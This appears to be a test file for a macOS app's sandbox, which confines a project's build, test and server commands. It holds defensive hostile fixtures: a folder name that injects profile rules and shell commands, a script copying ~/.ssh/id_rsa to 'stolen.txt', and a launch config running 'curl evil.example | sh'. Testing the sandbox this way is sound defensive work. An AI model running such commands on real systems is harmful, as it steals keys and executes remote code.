// Proof checks run the project's code, which the sandboxed agent can edit: its tests, sources and configs. The audit of
// 31 Oct 2026 (proof-unsandboxed-checks-run-agent-edited-code) found those ran on this Mac outside every box. Now every
// proof command runs in macOS's own sandbox (sandbox-exec), built from the same rules as Claude's own commands
// (sandbox.ts): writes only to the project, the package caches and a temporary folder of its own; never a read of the
// private places; no internet for the build, the checks, the tests and the server, only this Mac's own addresses. Where
// that box cannot be used, nothing the check would run runs without a yes on the scripts card.
// Only temporary folders, a stand in home folder and harmless commands. The one address tried that is not this Mac is a
// documentation address (192.0.2.1), and only from inside a box already seen to refuse a write.
import { afterEach, describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { CheckpointStore } from "../src/checkpoints.ts";
import { runLadder, type LadderOptions } from "../src/proof/ladder.ts";
import { memoryApprovals } from "../src/proof/approvedruns.ts";
import { runCommand, type RunOptions, type RunResult } from "../src/proof/exec.ts";
import { startServer } from "../src/proof/server.ts";
import { boxArgs, boxProfile, boxWorks, SANDBOX_EXEC, type Box } from "../src/proof/box.ts";
import type { Detected } from "../src/proof/detect.ts";
import type { BrowserResult } from "../src/proof/browser.ts";

const made: string[] = [];
afterEach(() => { while (made.length) rmSync(made.pop()!, { recursive: true, force: true }); });
const tmp = (l = "x") => { const d = realpathSync(mkdtempSync(join(tmpdir(), `companion-psb-${l}-`))); made.push(d); return d; };
const put = (root: string, files: Record<string, string>) => { for (const [p, c] of Object.entries(files)) { mkdirSync(dirname(join(root, p)), { recursive: true }); writeFileSync(join(root, p), c); } };
const res = (o: Partial<RunResult> = {}): RunResult => ({ code: 0, signal: null, stdout: "", stderr: "", timedOut: false, ms: 1, ...o });
const okBrowser = async (url: string): Promise<BrowserResult> => ({ ok: true, problems: [], consoleErrors: [], failedRequests: [], visited: [url], ms: 1 });
const okServer: NonNullable<LadderOptions["server"]> = async () => ({ ok: true, url: "http://127.0.0.1:1/", port: 1, stop: async () => {} });
const pkg = (scripts: Record<string, string>, deps: Record<string, string> = {}) => JSON.stringify({ name: "x", scripts, dependencies: deps });
const HAS_BOX = process.platform === "darwin" && existsSync(SANDBOX_EXEC);
const HOSTILE = `x") (allow file-write* (subpath "/")) ("y $(touch pwned) \`touch pwned2\` '; = q`;

// A home folder of the test's own, with a dummy key where the private places are, and a folder outside both.
function world() {
  const root = tmp("w");
  const home = join(root, "home"), outside = join(root, "outside"), project = join(root, "proj");
  put(home, { ".ssh/id_rsa": "dummy key\n", "Library/Application Support/Companion/runner/state.json": "{}" });
  mkdirSync(outside, { recursive: true }); mkdirSync(join(project, ".git"), { recursive: true });
  return { root, home, outside, project };
}
const boxed = (cwd: string, home: string, command: string, net: Box["net"] = "local", extra: Partial<RunOptions> = {}) =>
  runCommand(command, { cwd, timeoutMs: 30_000, env: { HOME: home }, box: { project: cwd, net }, ...extra });

describe("the box's rules are written so no folder name can change them", () => {
  test("no path is ever part of the profile's text: every path is a parameter", () => {
    const w = world();
    const project = join(w.root, HOSTILE);
    mkdirSync(project, { recursive: true });
    const p = boxProfile({ project, net: "local" }, { home: w.home, tmp: join(w.root, "t") });
    expect(p.text).not.toContain(HOSTILE);
    expect(p.text).not.toContain(w.root);
    expect(p.text).not.toContain(w.home);
    expect(Object.values(p.params)).toContain(realpathSync(project));
    const args = boxArgs({ project, net: "local" }, { home: w.home, tmp: join(w.root, "t") });
    expect(args[0]).toBe("-p");
    expect(args).toContain(`${Object.entries(p.params).find(([, v]) => v === realpathSync(project))![0]}=${realpathSync(project)}`);
  });
  test("the private places of sandbox.ts, the app's own data and the Keychain are refused for reading; the internet only when asked for", () => {
    const w = world();
    const local = boxProfile({ project: w.project, net: "local" }, { home: w.home, tmp: join(w.root, "t"), data: join(w.root, "data") });
    const values = Object.values(local.params);
    for (const p of [".ssh", "Library/Keychains", "Library/Application Support/Companion", ".claude"]) expect(values).toContain(join(w.home, p));
    expect(values).toContain(join(w.root, "data"));
    expect(local.text).toMatch(/\(deny network-outbound\)/);
    expect(local.text).toMatch(/\(allow network-outbound \(remote ip "localhost:\*"\)\)/);
    const open = boxProfile({ project: w.project, net: "open" }, { home: w.home, tmp: join(w.root, "t") });
    expect(open.text).not.toMatch(/\(deny network-outbound\)/);
    // Never a way out through another program started for it: Launch Services, Apple Events, launchd jobs.
    for (const t of [local.text, open.text]) for (const op of ["lsopen", "appleevent-send", "job-creation"]) expect(t).toContain(`(deny ${op})`);
  });
});

describe.skipIf(!HAS_BOX)("in the box, on this Mac", () => {
  test("the box works here, also for a folder with a hostile name", async () => {
    const w = world();
    expect(await boxWorks(w.project, { home: w.home })).toBe(true);
    const hostile = join(w.root, HOSTILE);
    mkdirSync(hostile, { recursive: true });
    expect(await boxWorks(hostile, { home: w.home })).toBe(true);
  });
  test("a command may write in the project and its own temporary folder, and nowhere else", async () => {
    const w = world();
    const r = await boxed(w.project, w.home, `echo ok > made.txt && echo t > "$TMPDIR/t.txt" && echo "$TMPDIR"; echo x > ${JSON.stringify(join(w.outside, "marker"))}; echo x > ${JSON.stringify(join(w.home, "marker"))}; echo x > .git/hooks-marker; true`);
    expect(r.code).toBe(0);
    expect(readFileSync(join(w.project, "made.txt"), "utf8")).toBe("ok\n");
    expect(existsSync(join(w.outside, "marker"))).toBe(false);
    expect(existsSync(join(w.home, "marker"))).toBe(false);
    expect(existsSync(join(w.project, ".git", "hooks-marker"))).toBe(false);   // git's folder is never a check's (rule 10)
    expect(r.stderr).toMatch(/Operation not permitted/);
    // Its temporary folder was its own, and is gone afterwards.
    const tmpUsed = r.stdout.trim().replace(/\/$/, "");
    expect(tmpUsed.length).toBeGreaterThan(0);
    expect(existsSync(tmpUsed)).toBe(false);
  });
  test("the watch's way of running a command (it ends when the app ends) is in the box too", async () => {
    const w = world();
    const r = await boxed(w.project, w.home, `echo ok > made.txt; echo x > ${JSON.stringify(join(w.outside, "marker"))}; true`, "local", { endWithUs: true });
    expect(r.code).toBe(0);
    expect(existsSync(join(w.project, "made.txt"))).toBe(true);
    expect(existsSync(join(w.outside, "marker"))).toBe(false);
  });
  test("a command cannot read the private places, or the app's own data", async () => {
    const w = world();
    const was = process.env.COMPANION_DATA;
    process.env.COMPANION_DATA = join(w.home, "Library/Application Support/Companion/runner");
    try {
      const r = await boxed(w.project, w.home, `cat "$HOME/.ssh/id_rsa"; echo "ssh=$?"; cat "$HOME/Library/Application Support/Companion/runner/state.json"; echo "data=$?"`);
      expect(r.stdout).not.toContain("dummy key");
      expect(r.stdout).toMatch(/ssh=1/);
      expect(r.stdout).toMatch(/data=1/);
    } finally { if (was === undefined) delete process.env.COMPANION_DATA; else process.env.COMPANION_DATA = was; }
  });
  test("a hostile folder name changes nothing: inside is writable, outside is not, and nothing in the name ran", async () => {
    const w = world();
    const project = join(w.root, HOSTILE);
    mkdirSync(project, { recursive: true });
    const r = await boxed(project, w.home, `echo ok > inside.txt; echo x > ${JSON.stringify(join(w.outside, "marker"))}; true`);
    expect(r.code).toBe(0);
    expect(existsSync(join(project, "inside.txt"))).toBe(true);
    expect(existsSync(join(w.outside, "marker"))).toBe(false);
    expect(readdirSync(w.root).some((f) => f.startsWith("pwned"))).toBe(false);
    expect(readdirSync(project).some((f) => f.startsWith("pwned"))).toBe(false);
  });
  test("this Mac's own addresses work in the box (a test's own server), the internet does not", async () => {
    const w = world();
    put(w.project, { "serve.js": `const s = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch: () => new Response("hello") }); console.log("got", await (await fetch("http://localhost:" + s.port + "/")).text()); s.stop(true);` });
    const r = await boxed(w.project, w.home, `${JSON.stringify(process.execPath)} serve.js`);
    expect(r.stdout).toContain("got hello");
    // Only from a box already seen to refuse a write outside the project.
    const out = await boxed(w.project, w.home, `echo x > ${JSON.stringify(join(w.outside, "m"))} 2>/dev/null && exit 9; /usr/bin/perl -MSocket -e 'socket(S, PF_INET, SOCK_STREAM, 0) or die; connect(S, sockaddr_in(80, inet_aton("192.0.2.1"))) ? print "connected\\n" : print "refused: $!\\n"'`);
    expect(out.code).not.toBe(9);
    expect(out.stdout).toMatch(/refused: Operation not permitted/);
  });
  test("the server rung's server runs in the box, and the app still reaches it on this Mac", async () => {
    const w = world();
    put(w.project, { "server.js": `Bun.serve({ hostname: "127.0.0.1", port: Number(process.env.PORT), fetch: () => new Response("up") });` });
    const srv = await startServer({ kind: "server", command: `echo x > ${JSON.stringify(join(w.outside, "m"))}; ${JSON.stringify(process.execPath)} server.js`, env: { HOME: w.home } }, { cwd: w.project, timeoutMs: 15_000, box: { project: w.project, net: "local" } });
    try {
      expect(srv.ok).toBe(true);
      if (srv.ok) expect(await (await fetch(srv.url)).text()).toBe("up");
    } finally { if (srv.ok) await srv.stop(); }
    expect(existsSync(join(w.outside, "m"))).toBe(false);
  });
  test("the ladder: a check that writes outside the project or reads a private place fails, and a test that keeps to the project passes", async () => {
    const w = world();
    const was = process.env.HOME;
    process.env.HOME = w.home;   // the commands' home is the stand in, so the private places are its dummy ones
    try {
      put(w.project, {
        "build.sh": `cat "$HOME/.ssh/id_rsa" > stolen.txt || exit 3\n`,
        "lint.sh": `echo x > ${JSON.stringify(join(w.outside, "marker"))} || exit 4\n`,
        "test.sh": `echo ok > test-output.txt && cat test-output.txt\n`,
      });
      const store = new CheckpointStore(tmp("s"), w.project);
      const s = await store.snapshot("as it is");
      const detect = (checks: Detected["checks"]): Detected => ({ kind: "node", packageManager: null, lockfile: null, checks, tests: { command: "sh test.sh" }, start: null });
      const go = (checks: Detected["checks"]) => runLadder({ project: w.project, store, beforeId: s.id, afterId: s.id, detect: () => detect(checks), browser: okBrowser as never });
      const readsKey = await go([{ name: "build", command: "sh build.sh" }]);
      expect(readsKey.verdict).toBe("failed");
      expect(readsKey.failedAt?.rung).toBe("checks");
      expect(existsSync(join(w.project, "stolen.txt")) ? readFileSync(join(w.project, "stolen.txt"), "utf8") : "").not.toContain("dummy key");
      const writesOut = await go([{ name: "lint", command: "sh lint.sh" }]);
      expect(writesOut.verdict).toBe("failed");
      expect(existsSync(join(w.outside, "marker"))).toBe(false);
      const fine = await go([]);
      expect(fine.steps.find((x) => x.rung === "tests")?.status).toBe("passed");
      expect(readFileSync(join(w.project, "test-output.txt"), "utf8")).toBe("ok\n");
    } finally { process.env.HOME = was; }
  });
});

describe("the ladder puts every command it runs in the box", () => {
  async function changed(before: Record<string, string>, after: Record<string, string>, o: Partial<LadderOptions> = {}) {
    const dir = tmp("p");
    put(dir, before);
    const store = new CheckpointStore(tmp("s"), dir);
    const b = await store.snapshot("before");
    put(dir, after);
    const a = await store.snapshot("after");
    const ran: { command: string; box?: Box }[] = [], served: (Box | undefined)[] = [];
    const result = await runLadder({ project: dir, store, beforeId: b.id, afterId: a.id, run: (async (command: string, ro: RunOptions) => { ran.push({ command, box: ro.box }); return res(); }) as never, browser: okBrowser as never, server: async (st, so) => { served.push((so as { box?: Box }).box); return okServer(st, so); }, limits: { startMs: 5000, browserMs: 5000 }, ...o });
    return { dir, result, ran, served };
  }
  const base = { "package.json": pkg({ dev: "vite", build: "vite build", test: "vitest" }), "node_modules/.keep": "" };
  test("the build, the tests and the server get no internet; an install does", async () => {
    const r = await changed({ "package.json": pkg({ dev: "vite", build: "vite build", test: "vitest" }) }, { "package.json": pkg({ dev: "vite", build: "vite build", test: "vitest" }, { zod: "4" }) }, { askScripts: async () => true, box: true });
    expect(r.ran.map((x) => x.command)).toEqual(["npm install", "npm run build", "npm run test"]);
    expect(r.ran.map((x) => x.box)).toEqual([{ project: r.dir, net: "open" }, { project: r.dir, net: "local" }, { project: r.dir, net: "local" }]);
    expect(r.served).toEqual([{ project: r.dir, net: "local" }]);
  });

  describe("where the box cannot be used, nothing the task changed runs without a yes (the interim rule)", () => {
    test("a task that only adds a test file asks, and on a no runs nothing", async () => {
      const asked: unknown[][] = [];
      const r = await changed(base, { "test/marker.test.js": "test('ok', () => {});\n" }, { box: false, askScripts: async (...a: unknown[]) => { asked.push(a); return false; } });
      expect(asked).toEqual([[true, true]]);
      expect(r.ran).toEqual([]);
      expect(r.served).toEqual([]);
      expect(r.result.verdict).not.toBe("passed");
      expect(r.result.gaps?.join(" ")).toMatch(/safety box/);
    });
    test("on a yes it runs, still with no box to put it in", async () => {
      const r = await changed(base, { "src/app.js": "export const x = 1;\n" }, { box: false, askScripts: async () => true });
      expect(r.ran.map((x) => x.command)).toEqual(["npm run build", "npm run test"]);
      expect(r.ran.every((x) => x.box === undefined)).toBe(true);
    });
    test("with no way to ask (Point at the problem, the watch), nothing runs", async () => {
      const r = await changed(base, { "src/app.js": "export const x = 1;\n" }, { box: false, noInstall: true, approvals: memoryApprovals() });
      expect(r.ran).toEqual([]);
      expect(r.served).toEqual([]);
      expect(r.result.gaps?.join(" ")).toMatch(/safety box/);
    });
  });
});

describe("a Python project goes through the same scripts card (ladder.ts no longer skips it)", () => {
  const python: Detected = { kind: "python", packageManager: null, lockfile: null, checks: [{ name: "lint", command: ".venv/bin/python -m ruff check ." }], tests: { command: ".venv/bin/python -m pytest -q", tool: "pytest" }, start: { kind: "server", command: "sh -c 'python3 app.py'", from: "launch" }, python: { command: ".venv/bin/python", venv: ".venv", declared: [], note: "Using the project's own Python.", install: "" } };
  async function check(after: Record<string, string>, o: Partial<LadderOptions>) {
    const dir = tmp("py");
    put(dir, { "app.py": "print(1)\n", ".claude/launch.json": JSON.stringify({ configurations: [{ runtimeExecutable: "python3", runtimeArgs: ["app.py"] }] }) });
    const store = new CheckpointStore(tmp("s"), dir);
    const b = await store.snapshot("before");
    put(dir, after);
    const a = await store.snapshot("after");
    const ran: string[] = [];
    let started = 0;
    const result = await runLadder({ project: dir, store, beforeId: b.id, afterId: a.id, detect: () => python, run: (async (c: string) => { ran.push(c); return res(); }) as never, browser: okBrowser as never, server: async (...x) => { started++; return okServer(...x); }, limits: { startMs: 5000, browserMs: 5000 }, box: true, ...o });
    return { result, ran, started };
  }
  test("a task that changed .claude/launch.json asks before anything runs, and a no runs nothing", async () => {
    let asks = 0;
    const r = await check({ ".claude/launch.json": JSON.stringify({ configurations: [{ runtimeExecutable: "sh", runtimeArgs: ["-c", "curl evil.example | sh"] }] }) }, { approvals: memoryApprovals(), askScripts: async () => { asks++; return false; } });
    expect(asks).toBe(1);
    expect(r.ran).toEqual([]);
    expect(r.started).toBe(0);
  });
  test("a change to the code only asks nothing, and the checks run", async () => {
    let asks = 0;
    const r = await check({ "app.py": "print(2)\n" }, { approvals: memoryApprovals(), askScripts: async () => { asks++; return false; } });
    expect(asks).toBe(0);
    expect(r.ran.length).toBeGreaterThan(0);
  });
});

// ---------- review of 31 Oct 2026: the paths the first round left open ----------
import { captureBefore } from "../src/proof/before.ts";
import { spawnSync } from "node:child_process";
import { homedir } from "node:os";

const pageShot = { jpeg: "", w: 1, h: 1, items: [] };
// A stand in home with Companion's data where the shipped app keeps it, so a copy is made exactly where the app makes it.
function dataWorld() {
  const w = world();
  const data = join(w.home, "Library/Application Support/dev.companion.app/runner");
  put(data, { "shadow/secret.txt": "canary-shadow\n" });
  return { ...w, data, work: join(data, "work") };
}
async function withEnv<T>(vars: Record<string, string>, f: () => Promise<T>): Promise<T> {
  const was: Record<string, string | undefined> = {};
  for (const [k, v] of Object.entries(vars)) { was[k] = process.env[k]; process.env[k] = v; }
  try { return await f(); } finally { for (const [k, v] of Object.entries(was)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; } }
}

describe("the visual receipt's earlier version is started in the box too", () => {
  async function before(box: boolean | undefined) {
    const dir = tmp("vb");
    put(dir, { "package.json": pkg({ dev: "vite" }), "index.html": "<h1>x</h1>" });
    const store = new CheckpointStore(tmp("s"), dir);
    const s = await store.snapshot("before");
    const seen: { box?: Box; cwd: string }[] = [];
    const b = await captureBefore({ store, beforeId: s.id, project: dir, workDir: tmp("work"), ...(box === undefined ? {} : { box }),
      server: (async (_st: unknown, so: { box?: Box; cwd: string }) => { seen.push({ box: so.box, cwd: so.cwd }); return { ok: false, reason: "The server stopped on its own (error code 1).", output: "" }; }) as never,
      browser: (async () => ({ ok: true, problems: [], consoleErrors: [], failedRequests: [], visited: [], ms: 1, shot: pageShot })) as never });
    return { b, seen };
  }
  test("its server gets the box, with only this Mac's own addresses, for the copy and nothing else", async () => {
    const { seen } = await before(true);
    expect(seen.length).toBe(1);
    expect(seen[0].box).toEqual({ project: seen[0].cwd, net: "local" });
  });
  test("where the box cannot be used, the earlier version is never started outside it: there is just no picture", async () => {
    const { b, seen } = await before(false);
    expect(seen).toEqual([]);
    expect(b).toEqual({ none: "not_pictured" });
  });
});

describe.skipIf(!HAS_BOX)("the app's own copies in its data folder, on this Mac", () => {
  test("an earlier version started from a copy inside the data folder can read its own files, and nothing else of the data folder; a write outside the copy is refused", async () => {
    const w = dataWorld();
    const proj = join(w.root, "live");
    put(proj, {
      ".claude/launch.json": JSON.stringify({ configurations: [{ runtimeExecutable: process.execPath, runtimeArgs: ["server.js"] }] }),
      "server.js": [
        `const fs = require("node:fs");`,
        `try { fs.writeFileSync(${JSON.stringify(join(w.outside, "marker"))}, "x"); } catch {}`,
        `let shadow = "refused"; try { shadow = fs.readFileSync("../../shadow/secret.txt", "utf8"); } catch {}`,
        `const own = fs.readFileSync("server.js", "utf8").length > 0 ? "own-ok" : "own-empty";`,
        `Bun.serve({ hostname: "127.0.0.1", port: Number(process.env.PORT), fetch: () => new Response(own + " " + shadow) });`,
      ].join("\n"),
    });
    const store = new CheckpointStore(tmp("s"), proj);
    const s = await store.snapshot("before");
    let body = "";
    const b = await withEnv({ HOME: w.home, COMPANION_DATA: w.data }, () => captureBefore({ store, beforeId: s.id, project: proj, workDir: w.work, startMs: 20_000,
      browser: (async (url: string) => { body = await (await fetch(url)).text(); return { ok: true, problems: [], consoleErrors: [], failedRequests: [], visited: [url], ms: 1, shot: pageShot }; }) as never }));
    expect("shot" in b).toBe(true);
    expect(body).toContain("own-ok");
    expect(body).not.toContain("canary-shadow");
    expect(existsSync(join(w.outside, "marker"))).toBe(false);
  }, 60_000);
  test("which task broke it: a check of a copy inside the data folder runs and passes, and the sibling shadow folder stays unreadable", async () => {
    const w = dataWorld();
    const copy = join(w.work, "bisect-x");
    put(copy, { "package.json": pkg({}), "test.sh": `cat package.json > /dev/null && echo tested\n` });
    const store = new CheckpointStore(tmp("s"), copy);
    const s = await store.snapshot("as it is");
    const r = await withEnv({ HOME: w.home, COMPANION_DATA: w.data }, () => runLadder({ project: copy, store, beforeId: s.id, afterId: s.id, noInstall: true,
      detect: () => ({ kind: "node", packageManager: null, lockfile: null, checks: [], tests: { command: "sh test.sh" }, start: null }), browser: okBrowser as never }));
    expect(r.steps.find((x) => x.rung === "tests")?.status).toBe("passed");
    const peek = await withEnv({ COMPANION_DATA: w.data }, () => boxed(copy, w.home, `cat ../../shadow/secret.txt; ls ..; true`));
    expect(peek.stdout).not.toContain("canary-shadow");
    expect(peek.stdout).not.toContain("bisect-x");
  }, 60_000);
  test("the box is only said to work for a project it can read", async () => {
    const w = world();
    const hidden = join(w.home, ".ssh", "proj");
    mkdirSync(hidden, { recursive: true });
    expect(await boxWorks(hidden, { home: w.home })).toBe(false);
    expect(await boxWorks(w.project, { home: w.home })).toBe(true);
  });
});

describe.skipIf(!HAS_BOX)("no way out through the Mac's settings store", () => {
  test("the rules refuse writing preferences", () => {
    const w = world();
    expect(boxProfile({ project: w.project, net: "local" }, { home: w.home, tmp: join(w.root, "t") }).text).toContain("(deny user-preference-write)");
    expect(boxProfile({ project: w.project, net: "open" }, { home: w.home, tmp: join(w.root, "t") }).text).toContain("(deny user-preference-write)");
  });
  test("defaults write in the box lands nowhere", async () => {
    const w = world();
    const domain = `com.example.companion-box-probe-${process.pid}-${Date.now()}`;
    const plist = join(homedir(), "Library/Preferences", `${domain}.plist`);
    try {
      const r = await boxed(w.project, w.home, `/usr/bin/defaults write ${domain} probe boxed-write-landed`);
      expect(r.code).not.toBe(0);
      const read = spawnSync("/usr/bin/defaults", ["read", domain, "probe"], { encoding: "utf8" });
      expect(read.stdout).not.toContain("boxed-write-landed");
    } finally {
      spawnSync("/usr/bin/defaults", ["delete", domain], { stdio: "ignore" });
      rmSync(plist, { force: true });
    }
  });
});

describe("a refusal by the box itself is a gap, never the project's failure", () => {
  const det = (tests: string): Detected => ({ kind: "node", packageManager: null, lockfile: null, checks: [{ name: "build", command: "build" }], tests: { command: tests }, start: null });
  async function check(out: { code: number; stderr: string }, o: Partial<LadderOptions> = {}, where: "build" | "test" = "test") {
    const dir = tmp("bg");
    put(dir, { "package.json": pkg({}) });
    const store = new CheckpointStore(tmp("s"), dir);
    const s = await store.snapshot("as it is");
    return runLadder({ project: dir, store, beforeId: s.id, afterId: s.id, detect: () => det("tests"), box: true, browser: okBrowser as never,
      run: (async (c: string) => ((where === "build") === (c === "build") ? res(out) : res())) as never, ...o });
  }
  const BOX_SAID = [
    ["a hard coded /tmp path", "Error: EPERM: operation not permitted, open '/tmp/app-cache.json'"],
    ["a shell write to /tmp", "sh: /tmp/companion-review-probe: Operation not permitted"],
    ["a browser that keeps its own sandbox on", "[1031/101010.1:FATAL:sandbox] sandbox initialization failed: Operation not permitted\nGPU process isn't usable. Goodbye."],
    ["a name lookup on the internet", "Error: getaddrinfo ENOTFOUND fonts.googleapis.com"],
    ["Next's font download", "Failed to fetch font `Geist`.\nURL: https://fonts.googleapis.com/css2?family=Geist"],
  ] as const;
  for (const [what, stderr] of BOX_SAID) {
    test(`tests stopped by the box (${what}) are a gap, and nobody is sent to fix them`, async () => {
      const r = await check({ code: 1, stderr });
      expect(r.verdict).toBe("passed_with_gaps");
      expect(r.failedAt).toBeUndefined();
      expect(r.steps.find((x) => x.rung === "tests")?.status).toBe("skipped");
      expect(r.gaps?.join(" ")).toMatch(/safety box/);
      expect(r.unclear?.some((u) => u.rung === "tests")).toBe(true);
    });
  }
  test("a build stopped by the box is a gap too, and which task broke it reads it as could not run", async () => {
    const r = await check({ code: 1, stderr: BOX_SAID[4][1] }, {}, "build");
    expect(r.verdict).not.toBe("failed");
    expect(r.checks?.find((c) => c.name === "build")?.status).toBe("not_started");
  });
  test("a real failure stays a failure, also one that reads a private place, and so does anything without the box", async () => {
    expect((await check({ code: 1, stderr: "AssertionError: expected 2 to be 3" })).verdict).toBe("failed");
    expect((await check({ code: 1, stderr: "cat: /Users/someone/.ssh/id_rsa: Operation not permitted" })).verdict).toBe("failed");
    expect((await check({ code: 1, stderr: "Error: getaddrinfo ENOTFOUND localhost" })).verdict).toBe("failed");
    expect((await check({ code: 1, stderr: BOX_SAID[0][1] }, { box: false, askScripts: async () => true })).verdict).toBe("failed");
  });
  test.skipIf(!HAS_BOX)("on this Mac: a test that writes a hard coded /tmp path is refused there and said as a gap", async () => {
    const w = world();
    const target = `/tmp/companion-review-probe-${process.pid}-${Date.now()}`;
    put(w.project, { "package.json": pkg({}), "t.sh": `echo x > ${target} || exit 1\n` });
    const store = new CheckpointStore(tmp("s"), w.project);
    const s = await store.snapshot("as it is");
    try {
      const r = await withEnv({ HOME: w.home }, () => runLadder({ project: w.project, store, beforeId: s.id, afterId: s.id, noInstall: true, detect: () => ({ kind: "node", packageManager: null, lockfile: null, checks: [{ name: "build", command: "true" }], tests: { command: "sh t.sh" }, start: null }), browser: okBrowser as never }));
      expect(existsSync(target)).toBe(false);
      expect(r.verdict).toBe("passed_with_gaps");
      expect(r.gaps?.join(" ")).toMatch(/safety box/);
    } finally { rmSync(target, { force: true }); }
  }, 30_000);
});
